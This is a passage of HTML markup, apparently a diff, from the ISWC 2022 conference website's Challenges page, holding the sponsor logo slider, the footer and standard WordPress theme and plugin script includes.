+<div class="n2-ss-layer n2-ow n-uc-12e7e99597a66" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-12e7e99597a66-inner"><div class="n2-ss-layer n2-ow n-uc-45y3YYujjfnW" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item8" alt="" class="skip-lazy" loading="lazy" width="212" height="158" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/ARTINT_Logo2_c_web_more.jpeg"></div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-12895d9ec26d5" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-12895d9ec26d5-inner"><div class="n2-ss-layer n2-ow n-uc-TbTa8SjGY5UT" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item9" alt="" class="skip-lazy" loading="lazy" width="899" height="293" data-skip-lazy="1" src="./../../wp-content/uploads/2022/10/google.png"></div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-12e2bf9249b47" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-12e2bf9249b47-inner"><div class="n2-ss-layer n2-ow n-uc-sffveqYoeV2p" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item10" alt="" class="skip-lazy" loading="lazy" width="712" height="712" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/Memect-logo-for-website.png.png"></div></div></div></div>
+</div></div></div></div></div></div></div>
+</div>
+<div data-slide-duration="0" data-id="34" data-slide-public-id="4" data-title="Gold Sponsors" class="n2-ss-slide n2-ow  n2-ss-slide-34">
+<div role="note" class="n2-ss-slide--focus" tabindex="-1">Gold Sponsors</div>
+<div class="n2-ss-layers-container n2-ss-slide-limiter n2-ow"><div class="n2-ss-layer n2-ow n-uc-PUBWL4PqeOsp" data-sstype="slide" data-pm="default"><div class="n2-ss-layer n2-ow n-uc-r6rhHCdxV9gk" data-pm="default" data-sstype="content" data-hasbackground="0"><div class="n2-ss-section-main-content n2-ss-layer-with-background n2-ss-layer-content n2-ow n-uc-r6rhHCdxV9gk-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-1e4f62ee275eb" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-1e4f62ee275eb-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-14d95d0f89983" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-14d95d0f89983-inner"><div class="n2-ss-layer n2-ow n-uc-fEFRjhnfHgIn" data-pm="normal" data-sstype="layer"><div id="n2-ss-4item11" class="n2-font-9165920ec0621fd9178cb884bd6c33f6-hover   n2-ss-item-content n2-ss-text n2-ow" style="display:block;">Gold Sponsors</div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-1d85941085228" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1d85941085228-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-187556ec187db" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-187556ec187db-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-14895dd839786" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-14895dd839786-inner"><div class="n2-ss-layer n2-ow n-uc-PYAp471Wkt2M" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item12" alt="" class="skip-lazy" loading="lazy" width="2300" height="1300" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/metaphacts-logo-standard.png"></div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-1af032d147d2d" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1af032d147d2d-inner"><div class="n2-ss-layer n2-ow n-uc-2hcfO4U5DWGG" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item13" alt="" class="skip-lazy" loading="lazy" width="259" height="81" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/Oracle_rgb_c74634.png"></div></div></div></div>
+</div></div></div></div></div>
+</div></div></div></div></div></div></div>
+</div>
+<div data-slide-duration="0" data-id="40" data-slide-public-id="5" data-title="Silver Plus Sponsors" class="n2-ss-slide n2-ow  n2-ss-slide-40">
+<div role="note" class="n2-ss-slide--focus" tabindex="-1">Silver Plus Sponsors</div>
+<div class="n2-ss-layers-container n2-ss-slide-limiter n2-ow"><div class="n2-ss-layer n2-ow n-uc-OkkIihPeBDiG" data-sstype="slide" data-pm="default"><div class="n2-ss-layer n2-ow n-uc-XRaxAb9yLY3h" data-pm="default" data-sstype="content" data-hasbackground="0"><div class="n2-ss-section-main-content n2-ss-layer-with-background n2-ss-layer-content n2-ow n-uc-XRaxAb9yLY3h-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-1d95b9f87f689" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-1d95b9f87f689-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-12370427bf092" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-12370427bf092-inner"><div class="n2-ss-layer n2-ow n-uc-PUGOqsWwYo0y" data-pm="normal" data-sstype="layer"><div id="n2-ss-4item14" class="n2-font-e9fe327db9886930c0a1d79074493d25-hover   n2-ss-item-content n2-ss-text n2-ow" style="display:block;">Silver Plus Sponsors</div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-110158b2af952" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-110158b2af952-inner"></div></div>
+<div class="n2-ss-layer n2-ow n-uc-139d094292238" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-139d094292238-inner"><div class="n2-ss-layer n2-ow n-uc-MK75LXMiz4rS" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item15" alt="" class="skip-lazy" loading="lazy" width="869" height="302" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/Springer_Logo.png"></div></div></div></div>
+</div></div></div></div></div></div></div>
+</div>
+<div data-slide-duration="0" data-id="35" data-slide-public-id="6" data-title="Silver Sponsors" class="n2-ss-slide n2-ow  n2-ss-slide-35">
+<div role="note" class="n2-ss-slide--focus" tabindex="-1">Silver Sponsors</div>
+<div class="n2-ss-layers-container n2-ss-slide-limiter n2-ow"><div class="n2-ss-layer n2-ow n-uc-IPQY9SagwNag" data-sstype="slide" data-pm="default"><div class="n2-ss-layer n2-ow n-uc-EF8rKSumDzbh" data-pm="default" data-sstype="content" data-hasbackground="0"><div class="n2-ss-section-main-content n2-ss-layer-with-background n2-ss-layer-content n2-ow n-uc-EF8rKSumDzbh-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-10f5f2037ea6a" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-10f5f2037ea6a-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-1128283a68263" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1128283a68263-inner"><div class="n2-ss-layer n2-ow n-uc-5r8SGxz2UZfk" data-pm="normal" data-sstype="layer"><div id="n2-ss-4item16" class="n2-font-9165920ec0621fd9178cb884bd6c33f6-hover   n2-ss-item-content n2-ss-text n2-ow" style="display:block;">Silver Sponsors</div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-106289ccb07b2" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-106289ccb07b2-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-15c84fcd75e98" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-15c84fcd75e98-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-19e7322032fd9" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-19e7322032fd9-inner"><div class="n2-ss-layer n2-ow n-uc-JHkxpM4fhr4G" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item17" alt="" class="skip-lazy" loading="lazy" width="435" height="156" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/BOSCH_ENGLISH_RGB.png"></div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-1310a1e1216d1" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1310a1e1216d1-inner"><div class="n2-ss-layer n2-ow n-uc-7FTSSnFEJZ3E" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item18" alt="" class="skip-lazy" loading="lazy" width="700" height="350" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/Logo-Ontotext-700x350-1.png"></div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-1daeacbd4ec53" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1daeacbd4ec53-inner"><div class="n2-ss-layer n2-ow n-uc-R09Q68kb5QGf" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item19" alt="" class="skip-lazy" loading="lazy" width="4584" height="1543" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/KGData-logo.png"></div></div></div></div>
+</div></div></div></div></div>
+</div></div></div></div></div></div></div>
+</div>
+<div data-slide-duration="0" data-id="36" data-slide-public-id="7" data-title="Doctoral Consortium Sponsor" class="n2-ss-slide n2-ow  n2-ss-slide-36">
+<div role="note" class="n2-ss-slide--focus" tabindex="-1">Doctoral Consortium Sponsor</div>
+<div class="n2-ss-layers-container n2-ss-slide-limiter n2-ow"><div class="n2-ss-layer n2-ow n-uc-Z7uvY9zkvkZH" data-sstype="slide" data-pm="default"><div class="n2-ss-layer n2-ow n-uc-AoiuoObDJ6oo" data-pm="default" data-sstype="content" data-hasbackground="0"><div class="n2-ss-section-main-content n2-ss-layer-with-background n2-ss-layer-content n2-ow n-uc-AoiuoObDJ6oo-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-1962251824ae2" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-1962251824ae2-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-1d5482854f375" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1d5482854f375-inner"><div class="n2-ss-layer n2-ow n-uc-fNHMUUMkQgcm" data-pm="normal" data-sstype="layer"><div id="n2-ss-4item20" class="n2-font-dc14667aa2824b2ed9556c5d8685c4b0-hover   n2-ss-item-content n2-ss-text n2-ow" style="display:block;">Doctoral Consortium Sponsor</div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-1824f2300d924" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1824f2300d924-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-16d86ee31826a" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-16d86ee31826a-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-1b0dafc671f80" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1b0dafc671f80-inner"></div></div>
+<div class="n2-ss-layer n2-ow n-uc-1fe3733430bc9" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1fe3733430bc9-inner"><div class="n2-ss-layer n2-ow n-uc-1t0UtTZ3UzJ7" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item21" alt="" class="skip-lazy" loading="lazy" width="1208" height="355" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/jwe-headline.jpg"></div></div></div></div>
+</div></div></div></div></div>
+</div></div></div></div></div></div></div>
+</div>
+<div data-slide-duration="0" data-id="37" data-slide-public-id="8" data-title="Other Sponsors" class="n2-ss-slide n2-ow  n2-ss-slide-37">
+<div role="note" class="n2-ss-slide--focus" tabindex="-1">Other Sponsors</div>
+<div class="n2-ss-layers-container n2-ss-slide-limiter n2-ow"><div class="n2-ss-layer n2-ow n-uc-zKnn1FJbuJBc" data-sstype="slide" data-pm="default"><div class="n2-ss-layer n2-ow n-uc-uHbV7hXEZMT1" data-pm="default" data-sstype="content" data-hasbackground="0"><div class="n2-ss-section-main-content n2-ss-layer-with-background n2-ss-layer-content n2-ow n-uc-uHbV7hXEZMT1-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-1ab5a9a53912a" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-1ab5a9a53912a-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-1381b0f95e42b" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1381b0f95e42b-inner"><div class="n2-ss-layer n2-ow n-uc-nHXLRly593S7" data-pm="normal" data-sstype="layer"><div id="n2-ss-4item22" class="n2-font-72aa918aeca0060b6954c82eef2c6e78-hover   n2-ss-item-content n2-ss-text n2-ow" style="display:block;">Other Sponsors</div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-1ba8941ee4ddf" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1ba8941ee4ddf-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-13a465b66c0a8" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-13a465b66c0a8-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-18baf78d0d284" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-18baf78d0d284-inner"></div></div>
+<div class="n2-ss-layer n2-ow n-uc-102893308dcc5" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-102893308dcc5-inner"><div class="n2-ss-layer n2-ow n-uc-U0WHbyyVTY1K" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item23" alt="" class="skip-lazy" loading="lazy" width="1035" height="399" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/ORKG_logo.png"></div></div></div></div>
+</div></div></div></div></div>
+</div></div></div></div></div></div></div>
+</div>                    </div>
+
+                                    </div>
+            </div>
+        </div>
+        <div class="n2-ss-slider-controls n2-ss-slider-controls-absolute-left-center"><div style="--widget-offset:15px;" class="n2-ss-widget n2-ss-widget-display-hover nextend-arrow n2-ow-all nextend-arrow-previous  nextend-arrow-animated-fade" id="n2-ss-4-arrow-previous" role="button" aria-label="previous arrow" tabindex="0">
+<img loading="lazy" decoding="async" width="32" height="32" class="n2-arrow-normal-img skip-lazy" data-skip-lazy="1" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxwYXRoIGQ9Ik0yMS41OCAyMy41OGwtNy45NjItNy41ODMgNy44Ni03LjQ4NWMuMzItLjI2Mi41MjItLjY1LjUyMi0xLjA4M0MyMiA2LjY0IDIxLjMyOCA2IDIwLjUgNmMtLjQwMyAwLS43NjguMTUtMS4wMzguMzk4bC0uMDA0LS4wMDQtOSA4LjU3di4wMDJjLS4yODIuMjYtLjQ1OC42MjQtLjQ1OCAxLjAyOFYxNmMwIC40MDQuMTc2Ljc3LjQ2IDEuMDNoLS4wMDJsOSA4LjU3Yy4yNy4yNDcuNjM4LjQgMS4wNDIuNC44MyAwIDEuNS0uNjQgMS41LTEuNDMgMC0uMzg0LS4xNi0uNzMzLS40Mi0uOTl6IgogICAgICAgICAgZmlsbD0iIzgxODk4ZCIgb3BhY2l0eT0iMSIgZmlsbC1ydWxlPSJldmVub2RkIi8+Cjwvc3ZnPg==" alt="previous arrow"><img loading="lazy" decoding="async" width="32" height="32" class="n2-arrow-hover-img skip-lazy" data-skip-lazy="1" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxwYXRoIGQ9Ik0yMS41OCAyMy41OGwtNy45NjItNy41ODMgNy44Ni03LjQ4NWMuMzItLjI2Mi41MjItLjY1LjUyMi0xLjA4M0MyMiA2LjY0IDIxLjMyOCA2IDIwLjUgNmMtLjQwMyAwLS43NjguMTUtMS4wMzguMzk4bC0uMDA0LS4wMDQtOSA4LjU3di4wMDJjLS4yODIuMjYtLjQ1OC42MjQtLjQ1OCAxLjAyOFYxNmMwIC40MDQuMTc2Ljc3LjQ2IDEuMDNoLS4wMDJsOSA4LjU3Yy4yNy4yNDcuNjM4LjQgMS4wNDIuNC44MyAwIDEuNS0uNjQgMS41LTEuNDMgMC0uMzg0LS4xNi0uNzMzLS40Mi0uOTl6IgogICAgICAgICAgZmlsbD0iIzgxODk4ZCIgb3BhY2l0eT0iMSIgZmlsbC1ydWxlPSJldmVub2RkIi8+Cjwvc3ZnPg==" alt="previous arrow">
+</div></div>
+<div class="n2-ss-slider-controls n2-ss-slider-controls-absolute-right-center"><div style="--widget-offset:15px;" class="n2-ss-widget n2-ss-widget-display-hover nextend-arrow n2-ow-all nextend-arrow-next  nextend-arrow-animated-fade" id="n2-ss-4-arrow-next" role="button" aria-label="next arrow" tabindex="0">
+<img loading="lazy" decoding="async" width="32" height="32" class="n2-arrow-normal-img skip-lazy" data-skip-lazy="1" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxwYXRoIGQ9Ik0yMiAxNS45OTd2LS4wMDNjMC0uNDA0LS4xNzYtLjc2OC0uNDYtMS4wMjhoLjAwMmwtOS04LjU3Mi0uMDA0LjAwNEMxMi4yNjggNi4xNSAxMS45MDIgNiAxMS41IDZjLS44MyAwLTEuNS42NC0xLjUgMS40MyAwIC40MzIuMjAzLjgyLjUyMyAxLjA4Mmw3Ljg2IDcuNDg1LTcuOTYzIDcuNTgzYy0uMjYuMjU3LS40Mi42MDYtLjQyLjk5IDAgLjc5LjY3IDEuNDMgMS41IDEuNDMuNDA0IDAgLjc3LS4xNTMgMS4wNC0uNGw5LjAwMi04LjU3di0uMDAyYy4yODItLjI2LjQ1OC0uNjI0LjQ1OC0xLjAyOHYtLjAwM3oiCiAgICAgICAgICBmaWxsPSIjODE4OThkIiBvcGFjaXR5PSIxIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiLz4KPC9zdmc+" alt="next arrow"><img loading="lazy" decoding="async" width="32" height="32" class="n2-arrow-hover-img skip-lazy" data-skip-lazy="1" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxwYXRoIGQ9Ik0yMiAxNS45OTd2LS4wMDNjMC0uNDA0LS4xNzYtLjc2OC0uNDYtMS4wMjhoLjAwMmwtOS04LjU3Mi0uMDA0LjAwNEMxMi4yNjggNi4xNSAxMS45MDIgNiAxMS41IDZjLS44MyAwLTEuNS42NC0xLjUgMS40MyAwIC40MzIuMjAzLjgyLjUyMyAxLjA4Mmw3Ljg2IDcuNDg1LTcuOTYzIDcuNTgzYy0uMjYuMjU3LS40Mi42MDYtLjQyLjk5IDAgLjc5LjY3IDEuNDMgMS41IDEuNDMuNDA0IDAgLjc3LS4xNTMgMS4wNC0uNGw5LjAwMi04LjU3di0uMDAyYy4yODItLjI2LjQ1OC0uNjI0LjQ1OC0xLjAyOHYtLjAwM3oiCiAgICAgICAgICBmaWxsPSIjODE4OThkIiBvcGFjaXR5PSIxIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiLz4KPC9zdmc+" alt="next arrow">
+</div></div>
+<div class="n2-ss-slider-controls n2-ss-slider-controls-absolute-center-bottom"><div style="--widget-offset:10px;" class="n2-ss-widget n2-ss-control-bullet n2-ow-all n2-ss-control-bullet-horizontal"><div class=" nextend-bullet-bar n2-bar-justify-content-center"><div class="n2-bullet n2-style-785355f374be86c332d4665aae819858-dot " style="visibility:hidden;"></div></div></div></div>
+</div>
+</div>
+<ss3-loader></ss3-loader>
+</div></div>
+<div class="n2_clear"></div>
+</div></div>			</div>
+<!-- .footer-one-box -->
+
+			
+			
+			
+			
+	</div>
+<!-- .container -->
+
+	
+</div>
+<!-- #footer-widgets -->
+
+
+
+<div id="footer-bottom" class="clr no-footer-nav">
+
+	
+	<div id="footer-bottom-inner" class="container clr">
+
+		
+		
+			<div id="copyright" class="clr" role="contentinfo">
+				Copyright © 2021-2023 ISWC 2022 | Conditions of Use | Privacy Policy			</div>
+<!-- #copyright -->
+
+			
+	</div>
+<!-- #footer-bottom-inner -->
+
+	
+</div>
+<!-- #footer-bottom -->
+
+
+	</div>
+<!-- #footer-inner -->
+
+	
+</footer><!-- #footer -->
+
+	
+	
+</div>
+<!-- #wrap -->
+
+
+</div>
+<!-- #outer-wrap -->
+
+
+
+<a aria-label="Scroll to the top of the page" href="#" id="scroll-top" class="scroll-top-right"><i class=" fa fa-angle-up" aria-hidden="true" role="img"></i></a>
+
+
+
+
+<!-- Enter your scripts here --><script src="./../../wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.2" id="jquery-ui-mouse-js"></script>
+<script src="./../../wp-includes/js/jquery/ui/slider.min.js?ver=1.13.2" id="jquery-ui-slider-js"></script>
+<script src="./../../wp-includes/js/imagesloaded.min.js?ver=5.0.0" id="imagesloaded-js"></script>
+<script id="oceanwp-main-js-extra">var oceanwpLocalize = {"nonce":"637cfe1a3b","isRTL":"","menuSearchStyle":"disabled","mobileMenuSearchStyle":"disabled","sidrSource":null,"sidrDisplace":"1","sidrSide":"left","sidrDropdownTarget":"link","verticalHeaderTarget":"link","customScrollOffset":"0","customSelects":".woocommerce-ordering .orderby, #dropdown_product_cat, .widget_categories select, .widget_archive select, .single-product .variations_form .variations select","ajax_url":".\/\/wp-admin\/admin-ajax.php","oe_mc_wpnonce":"a7a4b8d769"};</script>
+<script src="./../../wp-content/themes/oceanwp/assets/js/theme.min.js?ver=3.5.1" id="oceanwp-main-js"></script>
+<script src="./../../wp-content/themes/oceanwp/assets/js/drop-down-mobile-menu.min.js?ver=3.5.1" id="oceanwp-drop-down-mobile-menu-js"></script>
+<script src="./../../wp-content/themes/oceanwp/assets/js/vendors/magnific-popup.min.js?ver=3.5.1" id="ow-magnific-popup-js"></script>
+<script src="./../../wp-content/themes/oceanwp/assets/js/ow-lightbox.min.js?ver=3.5.1" id="oceanwp-lightbox-js"></script>
+<script src="./../../wp-content/themes/oceanwp/assets/js/vendors/flickity.pkgd.min.js?ver=3.5.1" id="ow-flickity-js"></script>
+<script src="./../../wp-content/themes/oceanwp/assets/js/ow-slider.min.js?ver=3.5.1" id="oceanwp-slider-js"></script>
+<script src="./../../wp-content/themes/oceanwp/assets/js/scroll-effect.min.js?ver=3.5.1" id="oceanwp-scroll-effect-js"></script>
+<script src="./../../wp-content/themes/oceanwp/assets/js/scroll-top.min.js?ver=3.5.1" id="oceanwp-scroll-top-js"></script>
+<script src="./../../wp-content/themes/oceanwp/assets/js/select.min.js?ver=3.5.1" id="oceanwp-select-js"></script>
+<script src="./../../wp-content/plugins/elementskit-lite/libs/framework/assets/js/frontend-script.js?ver=3.0.2" id="elementskit-framework-js-frontend-js"></script>
+<script id="elementskit-framework-js-frontend-js-after">var elementskit = {
+			resturl: './/index.php/wp-json/elementskit/v1/',
+		}</script>
+<script src="./../../wp-content/plugins/elementskit-lite/widgets/init/assets/js/widget-scripts.js?ver=3.0.2" id="ekit-widget-scripts-js"></script>
+<script src="./../../wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.17.3" id="elementor-webpack-runtime-js"></script>
+<script src="./../../wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.17.3" id="elementor-frontend-modules-js"></script>
+<script src="./../../wp-content/plugins/elementor/assets/lib/waypoints/waypoints.min.js?ver=4.0.2" id="elementor-waypoints-js"></script>
+<script id="elementor-frontend-js-before">var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselWrapperAriaLabel":"Carousel | Horizontal scrolling: Arrow Left & Right","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}},"version":"3.17.3","is_static":false,"experimentalFeatures":{"e_dom_optimization":true,"e_optimized_assets_loading":true,"e_optimized_css_loading":true,"additional_custom_breakpoints":true,"landing-pages":true},"urls":{"assets":".\/\/wp-content\/plugins\/elementor\/assets\/"},"swiperClass":"swiper-container","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":1217,"title":"Challenges%20%E2%80%93%20ISWC%202022","excerpt":"","featuredImage":false}};</script>
+<script src="./../../wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.17.3" id="elementor-frontend-js"></script>
+<script src="./../../wp-content/plugins/elementskit-lite/widgets/init/assets/js/animate-circle.min.js?ver=3.0.2" id="animate-circle-js"></script>
+<script id="elementskit-elementor-js-extra">var ekit_config = {"ajaxurl":".\/\/wp-admin\/admin-ajax.php","nonce":"02f999d47b"};</script>
+<script src="./../../wp-content/plugins/elementskit-lite/widgets/init/assets/js/elementor.js?ver=3.0.2" id="elementskit-elementor-js"></script>
+<!-- start Simple Custom CSS and JS -->
